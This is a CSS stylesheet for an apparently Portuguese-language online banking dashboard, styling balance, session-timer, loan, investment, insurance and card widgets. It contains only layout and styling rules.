        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] .saldo-refresh[_ngcontent-xfy-c6] svg[_ngcontent-xfy-c6] {
            width: 25px;
            height: 25px;
            margin-right: 5px;
        }

        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] p[_ngcontent-xfy-c6] {
            margin: 0px;
            font-size: 0.875rem;
            line-height: 1rem;
            font-weight: 600;
        }

        .usuario[_ngcontent-xfy-c6] .dados-conta[_ngcontent-xfy-c6] p.nome[_ngcontent-xfy-c6] {
            margin: 0px 0px 8px;
            font-size: 0.875rem;
            font-weight: 700;
            line-height: 1rem;
        }

        .usuario[_ngcontent-xfy-c6] .dados-conta[_ngcontent-xfy-c6] p[_ngcontent-xfy-c6] {
            margin: 0px;
            font-size: 0.875rem;
            font-weight: 500;
            line-height: 1rem;
        }

        .saldo-refresh span.moeda small {
            font-size: inherit;
            font-weight: inherit;
        }


        .sessao[_ngcontent-xfy-c7] {
            position: relative;
            width: 44px;
            height: 44px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        @media not all,
        not all {
            .sessao .label {
                position: absolute;
                left: 50%;
                top: 50%;
                transform: translate(-50%, -50%);
            }
        }

        .sessao .label {
            z-index: 1;
        }

        .sessao .label span {
            display: block;
            color: inherit;
            line-height: 1;
            text-align: center;
        }

        .sessao .label span:first-of-type {
            font-size: 0.875rem;
            font-weight: 600;
            line-height: 1rem;
        }

        .sessao .label span:last-of-type {
            font-size: 0.5rem;
            font-weight: 500;
            line-height: 0.75rem;
        }

        .sessao svg.clock {
            position: absolute;
            top: 0px;
            left: 0px;
            transform: rotate(-90deg);
        }

        .sessao svg.clock circle {
            stroke-width: 3;
        }

        .sessao svg.clock circle.remaining {
            transition: all 0.4s ease 0s;
        }


        div.toggle-switch {
            margin: 24px 0 12px;
            display: inline-flex;
            align-items: center;
        }

        div.toggle-switch span.label {
            font-size: .875rem;
            color: #9b9b9b;
        }

        div.toggle-switch span.label.active {
            color: #000;
        }

        @media not all {
            div.toggle-switch {
                display: block;
            }

            div.toggle-switch::after {
                content: "";
                display: inline-block;
                height: 100%;
            }

            div.toggle-switch>* {
                display: inline-block;
                vertical-align: middle;
            }
        }

        .switch {
            position: relative;
            display: inline-block;
            width: 40px;
            height: 20px;
            margin: 0 10px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 20px;
            background-color: #c9c9c9;
            transition: all .4s ease 0s;
        }

        .slider::before {
            position: absolute;
            content: "";
            height: 10px;
            width: 10px;
            left: 5px;
            bottom: 5px;
            border-radius: 50%;
            background-color: #fafafa;
            transition: all .4s ease 0s;
        }

        input:checked+.slider {
            background-color: #3b69ff;
        }

        input:checked+.slider::before {
            transform: translateX(20px);
        }

        input:focus+.slider {
            box-shadow: #3b69ff 0 0 1px;
        }

        .column {
            user-select: none;
        }

        .container {
            transition: none 0s ease 0s;
            width: 100%;
            max-width: 972px;
            margin: 0 auto;
        }

        [class*=" icon-"],
        [class^=icon-] {
            speak: none;
            font-style: normal;
            font-weight: 400;
            font-variant: normal;
            text-transform: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            font-family: icomoon !important;
        }

        .icon-arrow-line-next::before {
            content: "";
        }

        .icon-arrow-next::before {
            content: "";
        }

        .icon-arrow-prev::before {
            content: "";
        }

        * {
            box-sizing: border-box;
        }

        body,
        html {
            min-height: 100%;
            height: 100%;
        }

        body {
            font-family: Montserrat, sans-serif;
            background-color: #eeeff1;
        }

        h1,
        h2,
        h3,
        h4,
        h5 {
            margin: 0;
        }

        h1 {
            font-weight: 600;
            font-size: 1.375rem;
            line-height: 1.6875rem;
        }

        h2 {
            font-weight: 500;
            font-size: 1.375rem;
            line-height: 1.6875rem;
        }

        h3 {
            font-weight: 500;
            font-size: 1rem;
            line-height: 1.1875rem;
        }

        h4 {
            font-weight: 500;
            font-size: .875rem;
            line-height: 1.125rem;
        }

        a {
            color: #d3d3d3;
            text-decoration: none;
        }

        i.ico {
            box-sizing: border-box;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            width: 16px;
            height: 16px;
        }

        i.ico svg {
            width: 16px;
            height: 16px;
        }

        .container * {
            box-sizing: border-box;
        }

        .grid {
            position: relative;
            display: flex;
            flex-wrap: wrap;
        }

        @media (min-width:768px) {
            .grid {
                width: calc(100% + 24px);
                margin-left: -12px;
                margin-right: -12px;
            }
        }

        @media (max-width:768px) {
            .grid {
                margin-left: 8px;
                margin-right: 8px;
            }
        }

        .cell {
            overflow: hidden;
            font-size: .625rem;
            flex-grow: 0;
            flex-shrink: 1;
        }

        .cell.cell-card>* {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        @media (min-width:768px) {
            .grid.grid-8 {
                width: calc(100% + 24px);
                margin-left: -12px;
                margin-right: -12px;
            }

            .cell {
                flex-basis: calc(8.33333% - 24px);
                margin: 0 12px;
            }
        }

        @media (min-width:768px) {
            .cell.large-3 {
                flex-basis: calc(25% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-4 {
                flex-basis: calc(33.3333% - 24px);
            }

            .cell.cell-card.large-4 {
                flex-basis: calc(33.3333% - 4px);
                padding: 0 10px;
                margin: 0 2px;
            }
        }

        @media not all,
        not all {
            .cell.cell-card.large-4 {
                flex-basis: calc(33.3333% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-6 {
                flex-basis: calc(50% - 24px);
            }

            .cell.cell-card.large-6 {
                flex-basis: calc(50% - 4px);
                padding: 0 10px;
                margin: 0 2px;
            }
        }

        @media not all,
        not all {
            .cell.cell-card.large-6 {
                flex-basis: calc(50% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-8 {
                flex-basis: calc(66.6667% - 24px);
            }

            .cell.cell-card.large-8 {
                flex-basis: calc(66.6667% - 4px);
                padding: 0 10px;
                margin: 0 2px;
            }
        }

        @media not all,
        not all {
            .cell.cell-card.large-8 {
                flex-basis: calc(66.6667% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-9 {
                flex-basis: calc(75% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-12 {
                flex-basis: calc(100% - 24px);
            }
        }

        @media (max-width:768px) {
            .cell {
                flex-basis: calc(100% - 16px);
                margin: 0 8px;
            }

            .cell .grid {
                margin-left: -8px;
                margin-right: -8px;
            }
        }

        @media (min-width:768px) {
            .grid-8 .cell {
                flex-basis: calc(12.5% - 24px);
                margin: 0 12px;
            }
        }

        @media (min-width:768px) {
            .grid-8 .cell.large-4 {
                flex-basis: calc(50% - 24px);
            }
        }

        @media not all,
        not all {

            .grid-8 .cell.large-4:first-child,
            .grid-8 .cell.large-4:last-child {
                flex-basis: calc(50% - 48px);
            }
        }

        .btn {
            font-size: 14px;
            font-weight: 700;
            line-height: 24px;
            color: #000;
            background-color: transparent;
            border: 1px solid #000;
            padding: 8px 40px;
            outline: 0;
            transition: all .3s ease 0s;
            font-family: Montserrat, sans-serif;
            border-radius: 40px !important;
        }

        a.btn {
            appearance: none;
            user-select: none;
            display: inline-block;
            text-align: center;
        }

        .btn-medium {
            line-height: 24px;
            padding: 8px 40px;
            border-radius: 40px;
            font-size: 14px;
        }

        .btn-primary {
            background-color: #ff003e;
            border: thin solid #ff003e;
            color: #fff;
        }

        .btn-secondary {
            background-color: #fff;
            border: thin solid #ff003e;
            color: #ff003e;
        }

        .btn-block {
            max-width: 95%;
            width: 100%;
            margin: 0 auto;
        }

        .card-header {
            flex: 0 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 1rem 0;
        }

        .card-header a {
            color: #3b69ff;
            font-size: .75rem;
            line-height: .9375rem;
        }

        .card {
            flex: 1 0 auto;
            padding: 24px;
            border-radius: 4px;
            background-color: #fff;
            box-shadow: rgba(0, 0, 0, .15) 0 0 2px 0, rgba(0, 0, 0, .15) 0 2px 4px 0;
            box-sizing: border-box;
            margin-bottom: 1rem;
        }

        .card-grid {
            padding: 24px 0;
        }

        .card-grid .cell:first-child {
            padding-left: 24px;
        }

        .card-grid .cell:last-child {
            padding-right: 24px;
        }

        span.moeda {
            font-weight: 600;
            animation: .2s ease 0s 1 normal none running mostrarValores;
        }

        span.moeda small {
            font-weight: 400;
        }

        span.moeda small:first-child {
            padding-right: 2px;
        }

        .container+.container {
            margin-bottom: 48px;
        }

        .text-right {
            text-align: right;
            margin-right: 0;
            margin-left: 24px;
        }

        .alerts {
            margin-left: 0;
            padding: 10px 10px 10px 0;
        }

        @media not all,
        not all {
            .text-right {
                margin: 0 !important;
            }

            .large-4,
            .large-6,
            .large-8 {
                min-width: 308px;
            }
        }


        #hl-svg[_ngcontent-tfo-c13] {
            z-index: 9999;
            position: fixed;
            top: 0px;
            display: none;
            transition-duration: 0s;
        }

        #bg-t[_ngcontent-tfo-c13] {
            position: absolute;
            width: 100%;
            height: 100%;
            background-color: transparent;
            top: 0px;
            left: 0px;
            z-index: 9998;
        }


        dl[_ngcontent-tfo-c3] {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 27px 24px;
            margin: 0px -24px;
            height: 71px;
        }

        dl[_ngcontent-tfo-c3]:first-child {
            margin-top: -24px;
        }

        dl[_ngcontent-tfo-c3]+dl[_ngcontent-tfo-c3] {
            border-top: thin solid rgba(0, 0, 0, 0.1);
        }

        dl[_ngcontent-tfo-c3] dt[_ngcontent-tfo-c3] {
            font-size: 0.875rem;
        }

        dl[_ngcontent-tfo-c3] dt[_ngcontent-tfo-c3] h3[_ngcontent-tfo-c3] {
            font-weight: 400;
        }

        dl[_ngcontent-tfo-c3] dt[_ngcontent-tfo-c3] h3.investimentos[_ngcontent-tfo-c3] {
            max-width: 130px;
        }

        dl[_ngcontent-tfo-c3] dd[_ngcontent-tfo-c3] {
            margin-inline-start: 8px;
            font-size: 0.875rem;
            white-space: nowrap;
            margin-left: 0px;
        }

        dl.separator[_ngcontent-tfo-c3] dd[_ngcontent-tfo-c3],
        dl.separator[_ngcontent-tfo-c3] dt[_ngcontent-tfo-c3] {
            position: relative;
            min-height: 0.875rem;
        }

        dl.separator[_ngcontent-tfo-c3] dt[_ngcontent-tfo-c3]::before {
            left: 0px;
        }

        dl.separator[_ngcontent-tfo-c3] dd[_ngcontent-tfo-c3]::before {
            right: 0px;
        }

        dl.total[_ngcontent-tfo-c3] {
            border-top: thin solid rgba(0, 0, 0, 0.1);
            margin-bottom: -24px;
            font-weight: 400;
        }

        dl.total[_ngcontent-tfo-c3] dt[_ngcontent-tfo-c3] {
            margin-right: 2px;
        }

        span.moeda small {
            font-size: inherit;
            font-weight: inherit;
        }

        .card[_ngcontent-tfo-c3] {
            min-height: 360px;
            max-width: 308px;
        }

        .card-header[_ngcontent-tfo-c3] h2[_ngcontent-tfo-c3] {
            outline: 0px;
        }

        .link-ver-mais[_ngcontent-tfo-c3] {
            -webkit-user-drag: none;
            user-select: none;
        }


        h3[_ngcontent-tfo-c4] {
            font-size: 1rem;
            font-weight: 600;
            line-height: 1.5rem;
        }

        div.resumo[_ngcontent-tfo-c4] {
            max-width: 240px;
            margin-top: 16px;
        }

        div.resumo[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] {
            display: flex;
            position: relative;
            padding-bottom: 10px;
            margin: 0px;
            max-width: 100%;
            transition: all 0.4s ease 0.2s;
        }

        div.resumo[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4]:not(:first-child) {
            margin-top: 8px;
        }

        div.resumo[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] dd[_ngcontent-tfo-c4],
        div.resumo[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] dt[_ngcontent-tfo-c4] {
            flex: 0 0 auto;
            margin: 0px;
            font-size: 0.875rem;
            line-height: 1.5rem;
        }

        div.resumo[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] dt[_ngcontent-tfo-c4] {
            color: rgb(53, 54, 58);
            font-weight: 400;
        }

        div.resumo[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] dd[_ngcontent-tfo-c4] {
            padding-left: 16px;
            margin-left: auto;
            color: rgb(0, 0, 0);
            font-weight: 500;
            text-align: right;
        }

        div.resumo[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4]::after {
            content: "";
            display: block;
            position: absolute;
            left: 0px;
            bottom: 0px;
            height: 5px;
            width: 100%;
            min-width: 10px;
            border-radius: 5px;
            transition: all 0.4s ease 0s;
        }

        div.resumo[_ngcontent-tfo-c4] dl.entrada[_ngcontent-tfo-c4]::after {
            background-color: rgb(11, 204, 86);
        }

        div.resumo[_ngcontent-tfo-c4] dl.saida[_ngcontent-tfo-c4]::after {
            background-color: red;
        }

        div.resumo.hide[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] {
            max-width: 5px;
        }

        div.resumo.hide[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] dt[_ngcontent-tfo-c4] {
            width: 70px;
        }

        div.resumo.hide[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4] dd[_ngcontent-tfo-c4] {
            width: 60px;
        }

        div.resumo.hide[_ngcontent-tfo-c4] dl[_ngcontent-tfo-c4]::after {
            width: 10px;
        }

        dl.resumo[_ngcontent-tfo-c4] {
            display: flex;
            align-items: center;
            max-width: 240px;
            margin: 0px;
        }

        dl.resumo[_ngcontent-tfo-c4]:first-of-type {
            border-top: thin solid rgba(0, 0, 0, 0.15);
            padding-top: 8px;
            margin: auto 0px 0px;
        }

        dl.resumo[_ngcontent-tfo-c4]:first-of-type dd[_ngcontent-tfo-c4]:first-of-type span.moeda:not(.moeda-negativo) {
            color: rgb(11, 204, 86);
        }

        dl.resumo[_ngcontent-tfo-c4] dd[_ngcontent-tfo-c4],
        dl.resumo[_ngcontent-tfo-c4] dt[_ngcontent-tfo-c4] {
            margin: 8px 0px 0px;
            font-size: 0.875rem;
            line-height: 1.5rem;
        }

        dl.resumo[_ngcontent-tfo-c4] dt[_ngcontent-tfo-c4] {
            flex: 1 1 auto;
            font-weight: 400;
        }

        dl.resumo[_ngcontent-tfo-c4] dd[_ngcontent-tfo-c4] {
            padding-left: 16px;
            font-weight: 500;
        }

        .resumo-box[_ngcontent-tfo-c4] {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .box[_ngcontent-tfo-c4] {
            height: 100%;
            display: flex;
        }

        .box[_ngcontent-tfo-c4] .lancamento[_ngcontent-tfo-c4]::after {
            content: "";
            display: block;
            clear: both;
        }

        .box[_ngcontent-tfo-c4] .lancamento[_ngcontent-tfo-c4]>[_ngcontent-tfo-c4] {
            margin: 0px;
        }

        .box[_ngcontent-tfo-c4] .lancamento[_ngcontent-tfo-c4] .descricao[_ngcontent-tfo-c4] {
            padding-right: 10px;
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
            font-size: 0.875rem;
            font-weight: 400;
            line-height: 1.5rem;
        }

        .box[_ngcontent-tfo-c4] .lancamento[_ngcontent-tfo-c4] .valor[_ngcontent-tfo-c4] {
            float: right;
            width: fit-content;
            font-size: 0.875rem;
            font-weight: 500;
            line-height: 1.5rem;
        }

        .box[_ngcontent-tfo-c4] .lancamento[_ngcontent-tfo-c4] .favorecido[_ngcontent-tfo-c4] {
            clear: both;
            max-width: 210px;
            overflow-wrap: break-word;
            font-size: 0.75rem;
            font-weight: 400;
            line-height: 1rem;
        }

        @media not all,
        not all {
            dl.resumo[_ngcontent-tfo-c4] {
                display: flex;
                align-items: center;
                max-width: 224px;
                margin: 0px;
            }

            dl.resumo[_ngcontent-tfo-c4]:first-of-type {
                border-top: thin solid rgba(0, 0, 0, 0.15);
                padding-top: 8px;
            }

            dl.resumo[_ngcontent-tfo-c4]:first-of-type dd[_ngcontent-tfo-c4]:first-of-type span.moeda:not(.moeda-negativo) {
                color: rgb(11, 204, 86);
            }

            .box[_ngcontent-tfo-c4] brad-timeline[_ngcontent-tfo-c4] {
                height: 100%;
            }

            .box[_ngcontent-tfo-c4] brad-timeline[_ngcontent-tfo-c4] .data {
                margin-top: 20px;
            }
        }

        .card[_ngcontent-tfo-c4],
        .card[_ngcontent-tfo-c4] .container[_ngcontent-tfo-c4] {
            display: flex;
        }

        .cell[_ngcontent-tfo-c4] {
            display: flex;
            flex-direction: column;
        }

        .cell[_ngcontent-tfo-c4] brad-timeline {
            flex: 1 1 auto;
        }

        .card[_ngcontent-tfo-c4] {
            min-height: 360px;
            max-width: 640px;
        }

        @media not all,
        not all {
            .altura[_ngcontent-tfo-c4] {
                width: 100%;
                min-height: 310px;
            }

            .altura[_ngcontent-tfo-c4] .large-4[_ngcontent-tfo-c4] {
                min-width: 280px;
            }
        }


        .card[_ngcontent-tfo-c5] {
            position: relative;
            display: flex;
            flex-direction: column;
            min-height: 360px;
            max-width: 308px;
        }

        .emprestimo[_ngcontent-tfo-c5] {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .card[_ngcontent-tfo-c5] p[_ngcontent-tfo-c5] {
            font-size: 0.875rem;
            line-height: 1.5rem;
            margin-bottom: 0px;
        }

        .card[_ngcontent-tfo-c5] p[_ngcontent-tfo-c5]:last-of-type {
            margin-bottom: 32px;
        }

        .card[_ngcontent-tfo-c5] button[_ngcontent-tfo-c5] {
            margin-top: auto;
        }

        .emprestimo.mensagem[_ngcontent-tfo-c5] {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 95%;
            margin: 0px auto;
        }

        .emprestimo.mensagem[_ngcontent-tfo-c5] .icon[_ngcontent-tfo-c5] {
            width: 83px;
            height: 85px;
            margin: 18px 0px 34px;
            background-repeat: no-repeat;
            background-position: left center;
            background-size: 100%;
        }

        .emprestimo.mensagem[_ngcontent-tfo-c5] .icon.bloqueio[_ngcontent-tfo-c5] {
            background-image: url('./images/emprestimo-bloqueio.svg');
        }

        .emprestimo.mensagem[_ngcontent-tfo-c5] p[_ngcontent-tfo-c5] {
            font-size: 0.875rem;
            font-weight: 500;
            line-height: 1.5rem;
            text-align: center;
            margin: 0px;
        }

        @media not all,
        not all {
            .emprestimo.mensagem[_ngcontent-tfo-c5] {
                margin: 0px 6px;
            }

            .emprestimo.mensagem[_ngcontent-tfo-c5] p[_ngcontent-tfo-c5] {
                width: 188px;
            }
        }

        .emprestimo.mensagem[_ngcontent-tfo-c5] p[_ngcontent-tfo-c5]:nth-child(3) {
            margin-bottom: 45px;
        }

        button.bloqueio[_ngcontent-tfo-c5] {
            cursor: pointer;
            width: 244px;
            margin-bottom: 16px;
            margin-top: 0px !important;
        }

        strong[_ngcontent-tfo-c5] {
            font-weight: 600;
        }


        .btn-secondary.btn-effects:hover {
            background-color: rgb(225, 23, 63);
            border-color: rgb(225, 23, 63);
            color: rgb(255, 255, 255);
        }

        .btn-secondary.btn-effects:active {
            background-color: rgb(175, 0, 43);
            border-color: rgb(175, 0, 43);
            color: rgb(255, 255, 255);
        }

        .btn-secondary.btn-effects:disabled {
            background-color: rgb(255, 255, 255);
            border-color: rgb(167, 168, 172);
            color: rgb(167, 168, 172);
        }


        .novo-cartao[_ngcontent-tfo-c6] {
            display: flex;
            padding: 24px;
            margin: -24px 0px;
        }

        .novo-cartao[_ngcontent-tfo-c6] .content[_ngcontent-tfo-c6] {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        .novo-cartao[_ngcontent-tfo-c6] .content[_ngcontent-tfo-c6] h5[_ngcontent-tfo-c6],
        .novo-cartao[_ngcontent-tfo-c6] .content[_ngcontent-tfo-c6] p[_ngcontent-tfo-c6] {
            flex: 0 0 auto;
            font-size: 0.875rem;
            line-height: 1.5rem;
            margin: 0px 0px 24px;
        }

        .novo-cartao[_ngcontent-tfo-c6] .content[_ngcontent-tfo-c6] button[_ngcontent-tfo-c6] {
            flex: 0 0 auto;
            margin-top: auto;
        }

        .novo-cartao[_ngcontent-tfo-c6] .banner[_ngcontent-tfo-c6] {
            position: relative;
            background-color: rgba(0, 0, 0, 0.15);
            background-image: url('./images/card-home-cartoes-cliente-sem-cartao.jpg');
            background-repeat: no-repeat;
            background-position: center center;
            flex: 0 0 265px;
            height: 360px;
            margin: -24px -24px -24px 48px;
        }


        @media not all,
        not all {
            .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] .icons[_ngcontent-tfo-c7] {
                max-width: 100%;
            }
        }

        .card[_ngcontent-tfo-c7] {
            min-height: 360px;
            max-width: 474px;
        }

        .box-mensagens[_ngcontent-tfo-c7] {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 95%;
            margin: 0px 0px 30px;
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] .icons[_ngcontent-tfo-c7] {
            display: flex;
            flex-flow: row wrap;
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] .icons[_ngcontent-tfo-c7] .icon[_ngcontent-tfo-c7] {
            background-repeat: no-repeat;
            background-position: left center;
            background-size: 100%;
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] .icons[_ngcontent-tfo-c7] .icon.bloqueio-invest[_ngcontent-tfo-c7] {
            width: 75px;
            height: 80px;
            margin: 16px 0px 0px 56px;
            background-image: url('./images/investimentos-bloqueio.svg');
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] .icons[_ngcontent-tfo-c7] .icon.bloqueio-plus[_ngcontent-tfo-c7] {
            width: 24px;
            height: 24px;
            margin: 45px 0px 0px 24px;
            background-image: url('./images/investimentos-plus.svg');
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] .icons[_ngcontent-tfo-c7] .icon.bloqueio-agora[_ngcontent-tfo-c7] {
            width: 258px;
            height: 158px;
            position: relative;
            top: -24px;
            background-image: url('./images/investimentos-agora.png');
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] p[_ngcontent-tfo-c7] {
            font-size: 0.875rem;
            font-weight: 500;
            line-height: 1.5rem;
            text-align: center;
            margin: 0px;
        }

        @media not all,
        not all {
            .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] p[_ngcontent-tfo-c7] {
                max-width: 100%;
            }
        }

        .box-mensagens[_ngcontent-tfo-c7] .investimentos.mensagem[_ngcontent-tfo-c7] p[_ngcontent-tfo-c7]:nth-child(2) {
            margin: -15px 0px 18px;
        }

        .box-mensagens[_ngcontent-tfo-c7] button.bloqueio[_ngcontent-tfo-c7] {
            cursor: pointer;
            margin: 22px 0px 16px;
            width: 260px;
        }


        .box-mensagens[_ngcontent-tfo-c8] {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 95%;
            margin: 0px auto 28px;
        }

        .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] .icon[_ngcontent-tfo-c8] {
            width: 68px;
            height: 87px;
            margin: 16px 0px 40px;
            background-repeat: no-repeat;
            background-position: left center;
            background-size: 100%;
        }

        .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] .icon.bloqueio[_ngcontent-tfo-c8] {
            background-image: url('./images/meus-seguro-bloqueio.svg');
        }

        .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] p[_ngcontent-tfo-c8] {
            font-size: 0.875rem;
            font-weight: 500;
            line-height: 1.5rem;
            text-align: center;
            margin: 0px;
        }

        .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] p[_ngcontent-tfo-c8]:nth-child(2) {
            margin: 0px 0px 18px;
        }

        .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] p[_ngcontent-tfo-c8]:nth-child(3) {
            margin: 0px;
        }

        @media not all,
        not all {
            .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] p[_ngcontent-tfo-c8]:nth-child(2) {
                width: 320px;
            }

            .box-mensagens[_ngcontent-tfo-c8] .seguros.mensagem[_ngcontent-tfo-c8] p[_ngcontent-tfo-c8]:nth-child(3) {
                width: 380px;
            }
        }

        .box-mensagens[_ngcontent-tfo-c8] button.bloqueio[_ngcontent-tfo-c8] {
            cursor: pointer;
            margin: 0px 0px 16px;
            width: 260px;
        }


        .card-content[_ngcontent-tfo-c9] {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .card-content[_ngcontent-tfo-c9]>[_ngcontent-tfo-c9] {
            flex: 0 0 auto;
        }

        h4[_ngcontent-tfo-c9] {
            color: rgb(0, 0, 0);
            font-size: 0.875rem;
            line-height: 1.5rem;
            padding-bottom: 24px;
            border-bottom: thin solid rgb(201, 201, 201);
            margin-bottom: 23px;
        }

        dl[_ngcontent-tfo-c9] {
            margin-top: 0.5rem;
        }

        dl[_ngcontent-tfo-c9] dd[_ngcontent-tfo-c9],
        dl[_ngcontent-tfo-c9] dt[_ngcontent-tfo-c9] {
            color: rgb(92, 92, 92);
            font-size: 0.875rem;
            line-height: 1.5rem;
            margin: 0px;
        }

        dl[_ngcontent-tfo-c9] a[_ngcontent-tfo-c9] {
            color: rgb(59, 105, 255);
        }

        dl[_ngcontent-tfo-c9] dd[_ngcontent-tfo-c9]:last-child {
            color: rgb(0, 0, 0);
        }

        .btn[_ngcontent-tfo-c9] {
            margin-top: auto;
        }

        .card[_ngcontent-tfo-c9] {
            min-height: 360px;
            max-width: 308px;
        }


        .card[_ngcontent-tfo-c10] {
            position: relative;
            min-height: 360px;
            max-width: 308px;
        }

        .card[_ngcontent-tfo-c10] brad-carousel brad-carousel-next,
        .card[_ngcontent-tfo-c10] brad-carousel brad-carousel-prev {
            position: absolute;
            top: 24px;
        }

        .card[_ngcontent-tfo-c10] brad-carousel brad-carousel-next i,
        .card[_ngcontent-tfo-c10] brad-carousel brad-carousel-prev i {
            color: rgb(59, 105, 255);
            font-size: 0.875rem;
        }

        .card[_ngcontent-tfo-c10] brad-carousel brad-carousel-prev {
            right: 48px;
        }

        .card[_ngcontent-tfo-c10] brad-carousel brad-carousel-next {
            right: 24px;
        }

        .title[_ngcontent-tfo-c10] {
            border-bottom: thin solid rgb(201, 201, 201);
            margin-top: 7px;
            padding-bottom: 18px;
        }

        ul[_ngcontent-tfo-c10] {
            padding: 0px;
            list-style: none;
            margin: 0px 0px -20px;
        }

        ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10]:not(:last-child) {
            border-bottom: thin solid rgb(201, 201, 201);
        }

        ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] {
            display: flex;
            align-items: center;
            color: rgb(0, 0, 0);
            height: 56px;
        }

        ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] span[_ngcontent-tfo-c10] {
            flex-grow: 1;
            font-size: 0.85rem;
            line-height: 1.6rem;
        }

        ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] i[_ngcontent-tfo-c10] {
            width: 24px;
            height: 24px;
            color: rgb(59, 105, 255);
            font-size: 24px;
            transition: all 0.25s ease 0s;
        }

        ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] i[_ngcontent-tfo-c10]:hover {
            padding-left: 5px;
        }

        ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] i.icon-arrow-line-next[_ngcontent-tfo-c10]::before {
            margin-right: 5px;
            margin-left: -5px;
            transition: all 0.25s ease 0s;
        }

        ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10]:hover i[_ngcontent-tfo-c10] {
            padding-left: 5px;
        }

        @media not all,
        not all {
            ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] {
                text-align: justify;
                font-size: 0px !important;
            }

            ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10]>[_ngcontent-tfo-c10] {
                display: inline-block;
                vertical-align: middle;
            }

            ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] span[_ngcontent-tfo-c10] {
                width: calc(100% - 30px);
                text-align: left;
            }

            ul[_ngcontent-tfo-c10] li[_ngcontent-tfo-c10] a[_ngcontent-tfo-c10] i[_ngcontent-tfo-c10] {
                text-align: right;
            }
        }


        .card[data-total][_ngcontent-tfo-c11] {
            position: relative;
            margin-bottom: 45px;
            border-radius: 0px;
            box-shadow: rgba(0, 0, 0, 0.15) 0px 0px 2px 0px, rgba(0, 0, 0, 0.15) 0px 2px 4px 0px, rgb(255, 255, 255) 0px 30px 0px -15px, rgba(0, 0, 0, 0.15) 0px 35px 10px -15px, rgb(255, 255, 255) 0px 60px 0px -30px, rgba(0, 0, 0, 0.15) 0px 60px 5px -30px;
        }

        .card[data-total][data-total="0"][_ngcontent-tfo-c11] {
            margin-bottom: 1rem;
            box-shadow: rgba(0, 0, 0, 0.15) 0px 0px 2px 0px, rgba(0, 0, 0, 0.15) 0px 2px 4px 0px;
        }

        .card[_ngcontent-tfo-c11] {
            display: flex;
            flex-direction: column;
